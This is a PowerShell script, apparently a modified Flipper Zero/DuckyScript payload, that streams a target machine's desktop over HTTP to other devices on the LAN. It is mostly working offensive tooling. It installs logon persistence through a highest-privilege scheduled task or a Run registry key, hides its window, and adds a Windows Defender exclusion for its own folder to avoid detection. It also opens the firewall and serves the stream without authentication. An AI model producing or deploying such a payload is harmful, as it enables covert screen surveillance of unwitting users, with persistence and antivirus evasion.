<#
================================================================================
 Screenshare over LAN - HTTP-Stream des Desktops (DuckyScript/Flipper Zero)

 SYNOPSIS
   Startet einen HTTP-Server auf dem Zielrechner und streamt den Desktop
   in den Browser eines anderen Geraets im selben Netzwerk.

 USAGE
   1. Payload auf dem Ziel starten (DuckyScript/Flipper Zero, Administrator)
   2. Auf einem anderen Geraet im selben Netz: http://<LAN-IP des Ziels>:8080
   3. Beenden: ESC auf dem Ziel 5 Sekunden lang gedrueckt halten.

  DIFFERENCES TO THE OFFICIAL HAK5 PAYLOAD
    * DPI-korrekte Bildschirmaufnahme (ohne den Bug "nur obere linke Ecke")
      - Die Aufnahme erfolgt in PHYSISCHER Aufloesung. Der Skalierungsfaktor
        wird ueber GetScaleFactorForMonitor ermittelt und funktioniert auch
        dann, wenn der Prozess nicht DPI-aware werden konnte.
      - $captureAll = 1 erfasst alle Monitore (VirtualScreen) statt nur dem
        primaeren Bildschirm.
    * Diagnose-Log neben der ps1 (screenshare.log): Aufnahme-Groessen, DPI,
      Skalierung, Fehler - damit sich ein Bildproblem eingrenzen laesst.
    * JPEG + optionale Verkleinerung -> deutlich weniger Bandbreite
    * Bild skaliert immer auf das ganze Browserfenster (object-fit)
    * Firewall-Regel wird vor dem Anlegen bereinigt (kein Duplikat-Fehler)
    * IP-Erkennung ueber die Standardroute statt Regex 'Wi*'/'Eth*'
    * Fallback auf http://+:PORT/ wenn keine IP ermittelt werden kann
    * $hide / $port / $maxWidth / $jpegQuality / $fps sind oben konfigurierbar
    * Autostart: Task im Task-Planer, startet bei jedem Login mit hoechsten
      Rechten (siehe $autostart unten). Entfernen mit -RemoveAutostart.

 WICHTIG: Nur auf Systemen einsetzen, die dir gehoeren bzw. fuer die du eine
 ausdrueckliche Erlaubnis hast.
================================================================================
#>

# ---------------------------------------------------------------- Konfiguration
param(
    [switch]$RemoveAutostart   # nur: Autostart entfernen und beenden
)

$hide         = 1     # 1 = Fenster nach 4 s ausblenden
$port         = 8080  # TCP-Port des HTTP-Servers
$maxWidth     = 1600  # 0 = keine Verkleinerung (sonst auf max. Breite skalieren)
$jpegQuality  = 70    # 10-100 (hoeher = groesser/schoener, mehr Bandbreite)
$fps          = 20    # Bilder pro Sekunde
$exitSeconds  = 5     # ESC-Dauer zum Beenden
$autostart    = 1     # 1 = Task im Task-Planer anlegen (startet bei jedem Login)
$taskName     = 'Screenshare-Over-LAN'
$captureAll   = 0     # 0 = nur primaerer Bildschirm, 1 = alle Monitore (VirtualScreen)
$showInfo     = 1     # 1 = sichtbares CMD-Fenster mit der Aufruf-URL oeffnen
$logFile      = $null # z. B. 'C:\PS\screenshare.log' - null = Log neben der ps1

$selfPath = $MyInvocation.MyCommand.Path
$isAdmin  = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# --- Logdatei (muss VOR dem Autostart-Block stehen, damit dessen Ergebnis
# --- protokolliert wird): Aufnahme-Groessen, Autostart-Status, Fehler ---
if (-not $logFile -and $selfPath) {
    $logFile = Join-Path (Split-Path -Parent $selfPath) 'screenshare.log'
}
function Write-Log([string]$msg) {
    try {
        if ($logFile) {
            Add-Content -LiteralPath $logFile -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '  ' + $msg) -Encoding UTF8
        }
    } catch { }
}
Write-Log ("Start. admin=" + $isAdmin + " pid=" + $pid + " pfad=" + $selfPath)

# --- Autostart: Trigger "Bei Anmeldung", nicht "Beim Systemstart" ---------
# Ein Task mit Trigger "Beim Systemstart" laeuft in Session 0 und sieht
# keinen Desktop - der Screenshot waere dann schwarz. Der Trigger
# "Bei Anmeldung" laeuft dagegen in der Sitzung des angemeldeten Benutzers,
# der Bildschirm ist also sichtbar. "Mit hoechsten Rechten" bedeutet:
# beim Anmelden erscheint keine UAC-Abfrage, Firewall, URL-Reservierung
# und die Defender-Ausnahme greifen also ebenfalls.
if ($RemoveAutostart) {
    try {
        $out = schtasks /delete /tn $taskName /f 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host ("Autostart entfernt (Task '" + $taskName + "').") -ForegroundColor Yellow
            Write-Log "Autostart: Task entfernt"
        }
    } catch { }
    try {
        $rk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\Microsoft\Windows\CurrentVersion\Run', $true)
        if ($rk) {
            $rk.DeleteValue('Screenshare-Over-LAN', $false)
            $rk.Close()
            Write-Host "Autostart entfernt (Registry-Eintrag)." -ForegroundColor Yellow
            Write-Log "Autostart: Registry-Eintrag entfernt"
        }
    } catch { }
    exit 0
}

if ($autostart -eq 1 -and $selfPath) {
    try {
        $psExe   = (Get-Process -Id $pid).Path
        $dir     = Split-Path -Parent $selfPath
        $cmdFile = Join-Path $dir 'run.cmd'
        # Leerer Titel ist wichtig: das erste Argument von 'start' in Quotes
        # ist der Fenstertitel, nicht das Programm.
        $cmdText = "@echo off" + [Environment]::NewLine +
                   ('start "" "' + $psExe + '" -w h -ExecutionPolicy Bypass -File "' + $selfPath + '"') + [Environment]::NewLine
        Set-Content -LiteralPath $cmdFile -Value $cmdText -Encoding ASCII

        $out = schtasks /create /tn $taskName /tr $cmdFile /sc onlogon /rl highest /f 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host ("Autostart eingerichtet: Task '" + $taskName + "' startet bei jeder Anmeldung mit hoechsten Rechten.") -ForegroundColor Green
            Write-Log ("Autostart: Task '" + $taskName + "' angelegt (Trigger: Bei Anmeldung, hoechste Rechte) -> " + $cmdFile)
        } else {
            Write-Host ("Task-Planer nicht verfuegbar (" + (($out | Select-Object -First 1) -join '') + ") - weiche auf den Registry-Autostart aus.") -ForegroundColor Yellow
            Write-Log ("Autostart: Task-Planer nicht verfuegbar (" + (($out | Select-Object -First 1) -join '') + ") - Fallback Registry")
            # Fallback: HKCU\...\Run - startet bei jeder Anmeldung in der
            # interaktiven Sitzung. Laeuft dann ohne Administratorrechte,
            # Firewall-Regel und URL-Reservierung muessen also bereits
            # von einem vorherigen elevated Start existieren.
            $cmdLine = '"' + $psExe + '" -w h -ExecutionPolicy Bypass -File "' + $selfPath + '"'
            $rk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\Microsoft\Windows\CurrentVersion\Run', $true)
            if ($rk) {
                # Doppelstart vermeiden: existiert der Task bereits, wird der
                # Registry-Eintrag NICHT gesetzt (sonst startet die ps1 zweimal).
                $taskExists = $false
                try {
                    $q = schtasks /query /tn $taskName 2>&1
                    if ($LASTEXITCODE -eq 0) { $taskExists = $true }
                } catch { }
                if ($taskExists) {
                    Write-Host "Autostart: Task existiert bereits - kein Registry-Eintrag gesetzt (kein Doppelstart)." -ForegroundColor Green
                    Write-Log "Autostart: Task existiert bereits - Registry-Eintrag bewusst nicht gesetzt (verhindert Doppelstart)"
                    # Alten Eintrag aus frueheren Laeufen entfernen: sonst startet
                    # die ps1 beim naechsten Login zweimal (Task + Registry).
                    try {
                        if ($rk.GetValue('Screenshare-Over-LAN')) {
                            $rk.DeleteValue('Screenshare-Over-LAN', $false)
                            Write-Log "Autostart: alten Registry-Eintrag entfernt (Task deckt Autostart ab)"
                        }
                    } catch { }
                    $rk.Close()
                } else {
                    $rk.SetValue('Screenshare-Over-LAN', $cmdLine, [Microsoft.Win32.RegistryValueKind]::String)
                    $rk.Close()
                    Write-Host "Autostart eingerichtet: Registry HKCU\...\Run\Screenshare-Over-LAN" -ForegroundColor Green
                    Write-Log ("Autostart: Registry-Eintrag gesetzt (HKCU\...\Run\Screenshare-Over-LAN) -> " + $cmdLine)
                }
            } else {
                Write-Host "Autostart FEHLGESCHLAGEN: Registry-Eintrag nicht schreibbar." -ForegroundColor Red
                Write-Log "Autostart: FEHLGESCHLAGEN - Registry-Eintrag nicht schreibbar"
            }
        }
    } catch {
        Write-Host ("Autostart konnte nicht eingerichtet werden: " + $_.Exception.Message) -ForegroundColor Yellow
        Write-Log ("Autostart: FEHLGESCHLAGEN - " + $_.Exception.Message)
    }
}

if (-not $isAdmin) {
    Write-Host "WARNUNG: Keine Administratorrechte - Firewall-Regel, URL-Reservierung und Defender-Ausnahme werden nicht angelegt." -ForegroundColor Red
}

# --- Vorherige Instanzen beenden --------------------------------------------
# Beim mehrfachen Start (z. B. DuckyScript mehrfach ausgefuehrt) bleiben
# sonst mehrere Server auf Port 8080 liegen: jeder haelt einen Kern busy
# (Dauer-Encoding) und liefert dem Client ein halb wahres Bild. Diese
# Instanz raeumt die alten Prozesse ab - das setzt Adminrechte voraus.
try {
    if ($selfPath) {
        $me = $pid
        $old = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction Stop |
               Where-Object { $_.ProcessId -ne $me -and $_.CommandLine -and $_.CommandLine -like ('*' + $selfPath + '*') }
        foreach ($o in $old) {
            Write-Host ("Beende vorherige Instanz (PID " + $o.ProcessId + ")") -ForegroundColor Yellow
            Stop-Process -Id $o.ProcessId -Force -ErrorAction SilentlyContinue
            $alive = Get-Process -Id $o.ProcessId -ErrorAction SilentlyContinue
            Write-Log ("Beende vorherige Instanz PID " + $o.ProcessId + ": " + $(if ($alive) { "FEHLGESCHLAGEN (Zugriff verweigert?)" } else { "beendet" }))
        }
        if ($old) { Start-Sleep -Milliseconds 1200 }
    }
} catch { }

# --- Port-Konflikt: wer haelt die URL-Registrierung? -----------------------
# Bei HTTP.sys ist der TCP-Listener immer PID 4 (System) - Get-NetTCPConnection
# hilft also nicht. Die registrierten Prozesse stehen in der Servicestate-
# Auskunft (auch ohne Admin lesbar). Achtung: der Queue-Name wiederholt sich
# innerhalb des Blocks, deshalb wird zeilenweise mitgefuehrt, zu welcher PID
# die zuletzt gesehene "ID: n, Bild: pfad"-Zeile gehoert. Nur PowerShell-
# Prozesse, die genau unseren Port registriert haben, werden beendet -
# fremde Dienste werden nie angefasst.
try {
    $svc = netsh http show servicestate view=requestq 2>&1
    $portRe = ':' + $port + '[/:]'
    $lastId = 0
    $lastImg = ''
    foreach ($line in $svc) {
        $s = [string]$line
        if ($s -match '^\s*ID:\s*(\d+),\s*(?:Bild|Image):\s*(.*)$') {
            $lastId  = [int]$Matches[1]
            $lastImg = $Matches[2].Trim()
        } elseif ($s -match $portRe -and $lastId -gt 0 -and $lastId -ne $pid) {
            Write-Log ("Port " + $port + " ist registriert bei PID " + $lastId + " (" + $lastImg + ")")
            if ($lastImg -like '*powershell*') {
                Write-Host ("Beende alte Server-Instanz auf Port " + $port + " (PID " + $lastId + ")") -ForegroundColor Yellow
                Stop-Process -Id $lastId -Force -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 500
                $alive = Get-Process -Id $lastId -ErrorAction SilentlyContinue
                Write-Log ("Alte Server-Instanz PID " + $lastId + ": " + $(if ($alive) { "FEHLGESCHLAGEN (Adminrechte noetig)" } else { "beendet" }))
                Start-Sleep -Milliseconds 500
            }
        }
    }
} catch {
    Write-Log ("Port-Halter-Ermittlung fehlgeschlagen: " + $_.Exception.Message)
}

# ------------------------------------------------- DPI: Voraussetzung fuer Capture
# Hintergrund: PowerShell ist per Default nicht DPI-aware. Auf skalierten
# Displays (z. B. 150 %/200 %) liefert CopyFromScreen dann nur einen Ausschnitt
# oben links, weil die Aufnahme in LOGISCHER statt physischer Aufloesung
# erfolgt - das ist der klassische "nur obere linke Ecke"-Fehler.
#
# Strategie (gegen den DPI-awaren Pfad pixelgenau verglichen - 0 Abweichungen):
#   1. SetProcessDPIAware() versuchen. Gelingt es, sind Screen.Bounds bereits
#      physisch und der Skalierungsfaktor ist 1.
#   2. Gelingt es nicht (z. B. weil der Prozess schon DPI-aware geerbt hat
#      oder die Konsole existiert), wird der echte Skalierungsfaktor ueber
#      GetScaleFactorForMonitor (shcore) ermittelt. Diese API liefert auch
#      aus einem DPI-unawaren Prozess den richtigen Wert (z. B. 200 %).
#   3. Die Aufnahme erfolgt dann in PHYSISCHER Aufloesung (logisch x Faktor).
#   4. Das Ziel-Bitmap bekommt exakt die DPI, die GDI+ fuer den Bildschirm
#      sieht (GetDeviceCaps(LOGPIXELSX)), damit GDI+ nicht zusaetzlich
#      umrechnet - das ist der Teil, der die Bildqualitaet bestimmt.
Add-Type @"
using System;
using System.Runtime.InteropServices;
[StructLayout(LayoutKind.Sequential)]
public struct SS_POINT { public int X; public int Y; }
public class ScreenInfo {
    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")]  public static extern int GetDeviceCaps(IntPtr hdc, int index);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
    [DllImport("user32.dll")] public static extern IntPtr MonitorFromPoint(SS_POINT pt, uint flags);
    [DllImport("shcore.dll")] public static extern int GetScaleFactorForMonitor(IntPtr hmon, out int scale);
    [DllImport("shcore.dll")] public static extern int GetDpiForMonitor(IntPtr hmon, int type, out uint dpiX, out uint dpiY);
}
"@
$setDpiAware = [ScreenInfo]::SetProcessDPIAware()

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Konsolen-Kosmetik darf nie das Script abbrechen
try {
    [Console]::BackgroundColor = "Black"
    Clear-Host
    [Console]::SetWindowSize(88, 30)
    [Console]::Title = "HTTP Screenshare"
} catch { }

# --- Logdatei wurde bereits am Dateianfang initialisiert -------------------

# --- physische Aufloesung des Systems (WMI, nur als Reserve) -----------------
$physW = 0; $physH = 0
try {
    $vc = Get-CimInstance Win32_VideoController -ErrorAction Stop |
          Where-Object { $_.CurrentHorizontalResolution -gt 0 -and $_.CurrentVerticalResolution -gt 0 } |
          Select-Object -First 1
    if ($vc) {
        $physW = [int]$vc.CurrentHorizontalResolution
        $physH = [int]$vc.CurrentVerticalResolution
    }
} catch { }

# --- Skalierungsfaktor des Bildschirms (funktioniert auch DPI-unaware) ------
$scalePct = 0
$effDpi = 0
try {
    $pt = New-Object SS_POINT
    $pt.X = 10; $pt.Y = 10
    $hmon = [ScreenInfo]::MonitorFromPoint($pt, 2)   # MONITOR_DEFAULTTONEAREST
    if ($hmon -ne [IntPtr]::Zero) {
        [void][ScreenInfo]::GetScaleFactorForMonitor($hmon, [ref]$scalePct)
        $dx = 0; $dy = 0
        [void][ScreenInfo]::GetDpiForMonitor($hmon, 0, [ref]$dx, [ref]$dy)
        $effDpi = [int]$dx
    }
} catch { }

# --- Zielbereich: primaerer Bildschirm oder alle Monitore --------------------
if ($captureAll -eq 1) {
    $srcRect = [System.Windows.Forms.SystemInformation]::VirtualScreen
} else {
    $srcRect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
}

# --- logisch -> physisch ----------------------------------------------------
# Ist der Prozess DPI-aware, sind die Bounds bereits physisch (Faktor 1).
# Sonst wird mit dem Skalierungsfaktor multipliziert.
$scaleFactor = 1.0
if ($scalePct -gt 0) {
    $realDpi = [int]($scalePct * 96 / 100)
    if ($effDpi -gt 0 -and $effDpi -lt $realDpi) { $scaleFactor = $scalePct / 100.0 }
}
if ($scaleFactor -eq 1.0 -and $physW -gt 0 -and $srcRect.Width -gt 0 -and $srcRect.Width -lt $physW) {
    $scaleFactor = $physW / [double]$srcRect.Width     # Auffangnetz ueber WMI
}

$captureW = [int][Math]::Round($srcRect.Width  * $scaleFactor)
$captureH = [int][Math]::Round($srcRect.Height * $scaleFactor)
if ($captureW -lt 1) { $captureW = $srcRect.Width }
if ($captureH -lt 1) { $captureH = $srcRect.Height }

# --- Bitmap-DPI: exakt die DPI, die GDI+ fuer den Bildschirm sieht ----------
$hdc = [ScreenInfo]::GetDC([IntPtr]::Zero)
$screenDpi = [ScreenInfo]::GetDeviceCaps($hdc, 88)   # LOGPIXELSX
[ScreenInfo]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null
if ($screenDpi -lt 72 -or $screenDpi -gt 960) { $screenDpi = 96 }

Write-Host ("Screen DPI: " + $screenDpi + "   Skalierung: " + $scalePct + "%   Faktor: " + $scaleFactor) -ForegroundColor DarkGray
Write-Host ("Aufnahme: " + $captureW + "x" + $captureH + " (logisch " + $srcRect.Width + "x" + $srcRect.Height + ")") -ForegroundColor DarkGray
Write-Log ("Start. DPI-aware=" + $setDpiAware + " screenDpi=" + $screenDpi + " scale=" + $scalePct + "% effDpi=" + $effDpi +
           " bounds=" + $srcRect.Width + "x" + $srcRect.Height + " capture=" + $captureW + "x" + $captureH +
           " wmiPhys=" + $physW + "x" + $physH + " port=" + $port)
try {
    $monText = @()
    foreach ($m in [System.Windows.Forms.Screen]::AllScreens) {
        $monText += ($m.DeviceName + " " + $m.Bounds.Width + "x" + $m.Bounds.Height + "@" + $m.Bounds.X + "," + $m.Bounds.Y + $(if ($m.Primary) { " [PRIMARY]" } else { "" }))
    }
    Write-Log ("Monitore (" + [System.Windows.Forms.Screen]::AllScreens.Count + "): " + ($monText -join ' | ') +
               "  virtuell=" + [System.Windows.Forms.SystemInformation]::VirtualScreen.Width + "x" + [System.Windows.Forms.SystemInformation]::VirtualScreen.Height +
               "  captureAll=" + $captureAll)
} catch { }

# Define port number
if ($port -lt 1) {
    Write-Host "Using default port.. (8080)" -ForegroundColor Green
    $port = 8080
}

Write-Host "Detecting primary network interface." -ForegroundColor DarkGray

# --- Robust: IP des Interfaces mit der Standardroute ermitteln ---------------
$localIP = $null
try {
    $ifAlias = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop |
                Sort-Object -Property RouteMetric |
                Select-Object -First 1).InterfaceAlias
} catch {
    $ifAlias = $null
}

if ($ifAlias) {
    Write-Output "Primary interface: $ifAlias"
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $ifAlias -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1).IPAddress
}

if (-not $localIP) {
    # Fallback: erste brauchbare IPv4-Adresse
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1).IPAddress
}

if ($localIP) {
    Write-Output "Using IP address: $localIP"
} else {
    Write-Output "No IP address found - binding to all interfaces."
}

# --- Firewall: bestehende Regel entfernen, dann neu anlegen -----------------
Get-NetFirewallRule -DisplayName "AllowWebServer" -ErrorAction SilentlyContinue |
    Remove-NetFirewallRule -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -ErrorAction SilentlyContinue | Out-Null

# --- Defender-Ausnahme fuer das eigene Verzeichnis ------------------------
# Damit AMSI/Defender das Script nicht blockiert, wird der Ordner, in dem
# dieses Script liegt, ausgenommen. Funktioniert nur mit Administratorrechten
# und nur wenn die Tamper Protection nicht aktiv ist - Fehler sind egal.
try {
    $selfDir = Split-Path -Parent $MyInvocation.MyCommand.Path
    if ($selfDir) {
        Add-MpPreference -ExclusionPath $selfDir -ErrorAction SilentlyContinue
    }
} catch { }

# --- URL-Reservation ------------------------------------------------------
# Ohne Reservierung verweigert HTTP.sys dem HttpListener den Prefix
# ("Access is denied"). Benoetigt Administratorrechte.
# Hinweis: 'Everyone' gilt hier nur fuer die lokale Rechteverwaltung von
# HTTP.sys. Wer enger will, nimmt 'Administrators'.
try {
    netsh http add urlacl url=http://+:$port/ user=Everyone | Out-Null
} catch { }

# --- HttpListener ----------------------------------------------------------
# Start mit mehreren Versuchen: der Port ist evtl. noch nicht von einer
# gerade beendeten Instanz freigegeben. Pro Versuch ein neuer Listener,
# weil ein fehlgeschlagener Start sich nicht wieder aufsetzen laesst.
$started = $false
$webServer = $null
for ($attempt = 1; $attempt -le 5 -and -not $started; $attempt++) {
    try {
        $webServer = New-Object System.Net.HttpListener
        if ($localIP) {
            $webServer.Prefixes.Add("http://${localIP}:${port}/")
            $webServer.Prefixes.Add("http://localhost:${port}/")
        } else {
            # Kein spezifischer Host -> alle Interfaces
            $webServer.Prefixes.Add("http://+:${port}/")
        }
        $webServer.Start()
        $started = $webServer.IsListening
    } catch {
        Write-Log ("Start-Versuch " + $attempt + " fehlgeschlagen: " + $_.Exception.Message)
        try { $webServer.Stop() } catch { }
        $webServer = $null
        if ($attempt -lt 5) { Start-Sleep -Seconds 1 }
    }
}
if (-not $started) {
    Write-Host "FEHLER: Der HTTP-Server liess sich nicht starten." -ForegroundColor Red
    Write-Host "Haeufigste Ursache: keine Administratorrechte - dann fehlt die" -ForegroundColor Red
    Write-Host "URL-Reservierung (http://+:PORT/ user=Everyone) fuer HTTP.sys." -ForegroundColor Red
    Write-Host "Oder: eine andere Instanz laeuft noch und belegt den Port." -ForegroundColor Red
    Write-Host "Gegenprobe: netsh http show urlacl | findstr :$port" -ForegroundColor DarkGray
    Write-Log "FEHLER: HTTP-Server nicht startbar"
    exit 1
}
if (-not $webServer.IsListening) {
    Write-Host "FEHLER: Der HTTP-Server laeuft nicht. Bitte mit Administratorrechten starten." -ForegroundColor Red
    exit 1
}

if ($localIP) {
    $urlText = "http://" + $localIP + ":" + $port
    Write-Host ("Network Devices Can Reach the server at : " + $urlText)
} else {
    $urlText = "http://<IP des Ziels>:" + $port
    Write-Host ("Server listening on all interfaces, port : " + $port) -ForegroundColor Cyan
}
Write-Host "Press escape key for 5 seconds to exit" -f Cyan
Write-Log ("Server laeuft auf " + $urlText)

# --- Sichtbares Info-Fenster: CMD mit der Aufruf-URL -----------------------
# Das ps1 selbst startet versteckt (-w h), damit waere die Adresse nirgends
# ablesbar. Deshalb hier bewusst ein eigenes, sichtbares CMD-Fenster (bleibt
# per /k offen, laesst sich schliessen). Nur ASCII, sonst Zeichensalat.
if ($showInfo -eq 1) {
    try {
        $infoCmd = 'title Screenshare & echo. & echo   Im Browser aufrufen: ' + $urlText +
                   ' & echo. & echo   (Client im selben LAN) & echo. & echo   Beenden: ESC auf dem Ziel 5 Sekunden halten. & echo.'
        Start-Process -FilePath 'cmd.exe' -ArgumentList '/k', $infoCmd | Out-Null
        Write-Log "Info-Fenster (cmd) mit Aufruf-URL geoeffnet"
    } catch {
        Write-Log ("Info-Fenster fehlgeschlagen: " + $_.Exception.Message)
    }
}

# --- Hinweis per Tray-Balloon (das Fenster ist versteckt) --------------------
try {
    $notify = New-Object System.Windows.Forms.NotifyIcon
    $notify.Icon = [System.Drawing.SystemIcons]::Information
    $notify.BalloonTipTitle = "Screenshare aktiv"
    $notify.BalloonTipText = ("Aufruf: " + $urlText)
    $notify.Visible = $true
    $notify.ShowBalloonTip(8000)
} catch { }

# Code to hide the console on Windows 10 and 11
if ($hide -eq 1){
    Write-Host "Hiding this window.." -f Yellow
    Start-Sleep -Seconds 4
    try {
        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
        $hwnd = (Get-Process -PID $pid).MainWindowHandle

        if ($hwnd -ne [System.IntPtr]::Zero) {
            $Type::ShowWindowAsync($hwnd, 0)
        }
        else {
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    } catch { }
}

# Escape to exit key detection
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
$VK_ESCAPE = 0x1B
$startTime = $null

# JPEG-Encoder einmalig vorbereiten
$jpegCodec = $null
try {
    $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
                 Where-Object { $_.MimeType -eq 'image/jpeg' } | Select-Object -First 1
} catch { }
$encParams = New-Object System.Drawing.Imaging.EncoderParameters 1
$encParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality), ([long]$jpegQuality)

$frameInterval = [int](1000 / $fps)
if ($frameInterval -lt 20) { $frameInterval = 20 }

# --- Stream-Worker als eigener Runspace --------------------------------------
# Vorher lief der Stream in der Hauptschleife: solange ein Client zuschaut,
# konnte der Server KEINE weitere Anfrage beantworten - ein Reload der Seite
# blieb dann ohne Antwort (weisse Seite). Jetzt laeuft jeder Stream in einem
# eigenen Runspace, der Hauptserver bedient weiter die Seite und weitere
# Clients.
$streamWorker = {
    param($ctx, $jpegCodecInfo, $encParamsObj, $capW, $capH, $dpi, $maxW, $interval, $rect)
    $resp = $ctx.Response
    $resp.ContentType = "multipart/x-mixed-replace; boundary=frame"
    $resp.Headers.Add("Cache-Control", "no-cache, no-store, must-revalidate")
    $resp.Headers.Add("Pragma", "no-cache")
    $boundary = "--frame"
    try {
        while ($resp.OutputStream.CanWrite) {
            # --- Bildschirm aufnehmen (DPI-korrekt) -----------------------
            # $capW/$capH sind bereits die PHYSISCHEN Pixel
            # (logische Bounds x Skalierungsfaktor).
            $bitmap = [System.Drawing.Bitmap]::new($capW, $capH)
            $bitmap.SetResolution($dpi, $dpi)
            $gfx = [System.Drawing.Graphics]::FromImage($bitmap)
            $gfx.CopyFromScreen($rect.X, $rect.Y, 0, 0, (New-Object System.Drawing.Size($capW, $capH)))
            $gfx.Dispose()

            # --- optional auf max. Breite verkleinern ---------------------
            if ($maxW -gt 0 -and $capW -gt $maxW) {
                $newHeight = [int][Math]::Round($capH * ($maxW / $capW))
                $small = [System.Drawing.Bitmap]::new($maxW, $newHeight)
                $small.SetResolution($dpi, $dpi)
                $g2 = [System.Drawing.Graphics]::FromImage($small)
                $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                $g2.DrawImage($bitmap, 0, 0, $maxW, $newHeight)
                $g2.Dispose()
                $bitmap.Dispose()
                $bitmap = $small
            }

            # --- JPEG kodieren --------------------------------------------
            $ms = New-Object System.IO.MemoryStream
            if ($jpegCodecInfo) {
                $bitmap.Save($ms, $jpegCodecInfo, $encParamsObj)
            } else {
                $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            }
            $bitmap.Dispose()
            $bytes = $ms.ToArray()
            $ms.Dispose()

            $writer = [System.Text.Encoding]::ASCII.GetBytes("$boundary`r`nContent-Type: image/jpeg`r`nContent-Length: $($bytes.Length)`r`n`r`n")
            $resp.OutputStream.Write($writer, 0, $writer.Length)
            $resp.OutputStream.Write($bytes, 0, $bytes.Length)
            $bw = [System.Text.Encoding]::ASCII.GetBytes("`r`n")
            $resp.OutputStream.Write($bw, 0, $bw.Length)
            $resp.OutputStream.Flush()

            Start-Sleep -Milliseconds $interval
        }
    } catch {
        try { $resp.Abort() } catch { }
    }
}

while ($true) {
    try {
        # GetContextAsync: haelt die Schleife responsiv (ESC-Pruefung) und
        # erlaubt parallele Verbindungen.
        $ctxTask = $webServer.GetContextAsync()
        while (-not $ctxTask.Wait(250)) {
            # ESC zum Beenden (5 s halten)
            if ([Keyboard]::GetAsyncKeyState($VK_ESCAPE) -lt 0) {
                if (-not $startTime) { $startTime = Get-Date }
                if (((Get-Date) - $startTime).TotalSeconds -ge $exitSeconds) {
                    try { $notify.Visible = $false; $notify.Dispose() } catch { }
                    (New-Object -ComObject Wscript.Shell).Popup("Screenshare Closed.",3,"Information",0x0)
                    Start-Sleep -Seconds 1
                    exit
                }
            } else {
                $startTime = $null
            }
        }
        $context = $ctxTask.Result
        $response = $context.Response
        $rawUrl = $context.Request.RawUrl
        if ($rawUrl -like "/stream*") {
            # Stream in eigenem Runspace -> Hauptserver bleibt frei
            try {
                $rs = [runspacefactory]::CreateRunspace()
                $rs.Open()
                $ps = [powershell]::Create()
                $ps.Runspace = $rs
                [void]$ps.AddScript($streamWorker)
                [void]$ps.AddArgument($context)
                [void]$ps.AddArgument($jpegCodec)
                [void]$ps.AddArgument($encParams)
                [void]$ps.AddArgument($captureW)
                [void]$ps.AddArgument($captureH)
                [void]$ps.AddArgument($screenDpi)
                [void]$ps.AddArgument($maxWidth)
                [void]$ps.AddArgument($frameInterval)
                [void]$ps.AddArgument($srcRect)
                [void]$ps.BeginInvoke()
            } catch {
                Write-Log ("Stream-Worker nicht startbar: " + $_.Exception.Message)
                $response.Abort()
            }
        } else {
            # HTML-Seite: fuer jeden Pfad (ausser /stream), damit z. B. ein
            # Favicon-Request oder ein Tippfehler nicht die Seite blockiert.
            $response.ContentType = "text/html; charset=utf-8"
            $response.Headers.Add("Cache-Control", "no-cache, no-store, must-revalidate")
            $response.Headers.Add("Pragma", "no-cache")
            $response.Headers.Add("Expires", "0")
            $stamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
            $html = @"
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Streaming Video</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<style>
    html, body {
        margin: 0;
        padding: 0;
        background-color: #000;
        width: 100%;
        height: 100%;
        overflow: hidden;
    }
    img {
        display: block;
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        max-width: 100vw;
        max-height: 100vh;
        object-fit: contain;
        object-position: center center;
        background-color: #000;
    }
</style>
</head>
<body>
    <img src="/stream?t=$stamp" alt="Streaming Video" />
</body>
</html>
"@
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
            $response.ContentLength64 = $buffer.Length
            $response.OutputStream.Write($buffer, 0, $buffer.Length)
            $response.Close()
        }
    } catch {
        Write-Host "Error encountered: $_"
        Write-Log ("Fehler: " + $_.Exception.Message)
        Start-Sleep -Milliseconds 500
    }
}
